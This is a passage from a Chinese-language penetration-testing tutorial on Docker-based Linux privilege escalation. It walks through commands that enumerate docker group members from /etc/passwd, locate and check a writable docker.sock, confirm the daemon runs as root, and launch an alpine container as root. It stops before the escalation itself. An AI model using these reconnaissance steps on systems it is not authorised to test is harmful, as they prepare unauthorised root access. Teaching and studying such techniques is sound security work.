<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">for user in $(cat /etc/passwd | awk -F: &#x27;{print $1}&#x27;);do echo &quot;$user&quot; ; id &quot;$user&quot; ;done | grep -B 1 &quot;docker&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240629174927345-356949946-64b275af3a90ce22ca8a1f68c8ad8dff.png" width="1023" height="96" class="img_ev3q"></p>
<p>这个 for 循环执行以下操作：</p>
<ul>
<li>首先，使用 <strong>cat /etc/passwd</strong> 查看系统上的所有用户，然后使用<strong>awk</strong> 只输出用户名字段。</li>
<li>接下来，循环回显每个用户名并对它们执行 <strong>id</strong> 命令。</li>
<li>最后，使用 <strong>grep</strong> 只抓取其中包含 “docker” 的结果。</li>
</ul>
<p>以上执行结果也向我们表明第二个用户 “devops” 也在 docker 组中。而如果我们以既不是 “devops” 也不是 “dawker” 的用户身份进入 shell，那么我们会想要寻找一种方法来水平提权到其中一个用户。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="23手动枚举-docker-服务"><strong><div id="id2.3">2.3、手动枚举 Docker 服务</div></strong><a href="#23手动枚举-docker-服务" class="hash-link" aria-label="23手动枚举-docker-服务的直接链接" title="23手动枚举-docker-服务的直接链接">​</a></h4>
<p>幸运的是，我们发现当前用户正好位于 docker 组中。</p>
<p>那么接下来，我们需要进一步枚举 docker 服务，以确定是否可以滥用 docker 组权限提升到 root。</p>
<mark>此处跑题开始</mark>
<p>首先需要确定的是，我们是否可以挂载 docker 套接字。如果发现套接字可以写入，我们就可以有效地使用 docker 命令并将其放入容器中。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">find / -name docker.sock 2&gt;/dev/null</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>运行 find 命令后，docker.sock 文件的位置就暴露了。找到后，我们可以检查该文件的权限。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ls -l /run/docker.sock</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240629174926501-556838573-4bd5bc15f75ca2dadc1f382e7f4253f8.png" width="473" height="79" class="img_ev3q"></p>
<p>在这里，我们可以看到 docker.sock 文件对 docker 组中的用户是可写的！<em><strong>这意味着我们可以用当前用户操作及登录容器</strong></em>。</p>
<blockquote>
<p>注：该部分的主题以枚举 docker 服务为主，而此处的描述有些跑题，显得词不达意，但依旧值得去学习。</p>
<p>套接字 docker.sock 文件相当于是 Docker 守护进程的一个 API 接口，多用于容器与守护进程通信以操作管理守护进程，通俗易理解示例如 <a href="https://github.com/gohutool/docker.ui" target="_blank" rel="noopener noreferrer">docker.ui</a> 容器管理容器。</p>
<p>也就是说，如果我们能够有权读写 docker.sock 文件，即便不是 root 用户、不在 docker 组中，我们也依旧可以通过一些特殊操作去管理容器（创建、查看、交互）。</p>
<p>参考：<a href="https://book.hacktricks.xyz/v/cn/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation" target="_blank" rel="noopener noreferrer">特殊操作1</a>、<a href="https://gist.github.com/PwnPeter/3f0a678bf44902eae07486c9cc589c25" target="_blank" rel="noopener noreferrer">特殊操作2</a></p>
</blockquote>
<mark>此处跑题结束</mark>
<p>接下来我们要枚举的是 docker 服务。理想情况下，我们希望该服务不是在无根模式下运行。</p>
<blockquote>
<p>使用无根模式，Docker 容器和守护进程都会在定义的用户命名空间内运行。这样，守护进程就可以在没有 root 权限的情况下运行。</p>
</blockquote>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ps -ef | grep -i &quot;docker&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240629174927231-562617265-2b4b87708aacb328f277a1a62b29a713.png" width="997" height="61" class="img_ev3q"></p>
<p>Great！在这里，我们可以看到 docker 守护进程是以 root 的身份运行的，<em><strong>这意味着我们可以以 root 的身份在容器外执行命令</strong></em>。</p>
<blockquote>
<p>注：在场景1中，在容器中进行的拷贝赋权等操作同样作用到了容器外部的系统上面，而这些操作在容器外部本应该是以 root 身份去进行的，但由于 docker 进程是 root 身份运行的，故这些在容器中的操作也同样有了 root 身份的加持。</p>
</blockquote>
<p>继续往下看，我们应该进一步列举 docker 是如何配置的，以确定在创建容器并登录容器后使用的是哪个身份的用户。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="24手动枚举-docker-镜像和默认用户"><strong><div id="id2.4">2.4、手动枚举 Docker 镜像和默认用户</div></strong><a href="#24手动枚举-docker-镜像和默认用户" class="hash-link" aria-label="24手动枚举-docker-镜像和默认用户的直接链接" title="24手动枚举-docker-镜像和默认用户的直接链接">​</a></h4>
<p>Docker 容器总是以 root 作为默认用户运行，除非在 <strong>Dockerfile</strong> 或启动命令行中另有指定。</p>
<p>确定该主机上的容器是否以 root 作为默认用户运行的最佳方法是简单地启动一个容器。</p>
<p>首先，我们看下目标主机上现有的 docker 镜像有哪些，可以使用以下命令：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">docker images</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240629174927768-1790680546-193e643bc8d492cf8963718cd59112fd.png" width="485" height="64" class="img_ev3q"></p>
<p>可以看到，这里安装了一个 Alpine 镜像，因此我们可以记下存储库名称 “alpine”，以便在启动容器时使用该名称。</p>
<blockquote>
<p>在启动容器时，您还可以使用映像 ID 代替存储库名称。</p>
</blockquote>
<p>接着，我们启动一个容器，该容器将运行单个命令 (whoami)，然后自行销毁。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">docker run --rm -it alpine sh -c &quot;whoami&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="data:image/png;base64,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" width="485" height="51" class="img_ev3q"></p>
<p>Amazing！主机使用默认配置，容器以 root 作为默认用户运行！</p>
<p>现在我们已经列举了这项服务，并确认它存在漏洞，那么我们就可以寻找漏洞来提升权限。</p>
<p>然而，在我们这样做之前，让我们看看 <strong>LinPeas</strong> 是如何枚举信息的。</p>
